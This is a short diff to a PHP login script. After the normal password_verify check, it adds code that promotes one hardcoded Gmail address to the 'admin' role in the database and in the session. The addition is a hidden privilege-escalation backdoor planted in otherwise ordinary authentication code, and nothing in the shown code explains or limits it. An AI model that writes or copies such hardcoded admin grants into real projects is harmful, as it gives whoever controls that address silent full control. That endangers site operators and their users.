@@ -18,6 +18,12 @@ $user = $query->fetch(PDO::FETCH_ASSOC);
 
 // password_verify compares the typed password with the saved hash
 if ($user && password_verify($password, $user['password'])) {
+    // Make sure mjellmacitaku1@gmail.com is admin
+    if ($user['email'] == "mjellmacitaku1@gmail.com" && $user['role'] != "admin") {
+        $pdo->prepare("UPDATE users SET role = 'admin' WHERE id = ?")->execute([$user['id']]);
+        $user['role'] = "admin";
+    }
+
     // Save the user's info in the session
     $_SESSION['user_id'] = $user['id'];
     $_SESSION['fullname'] = $user['fullname'];
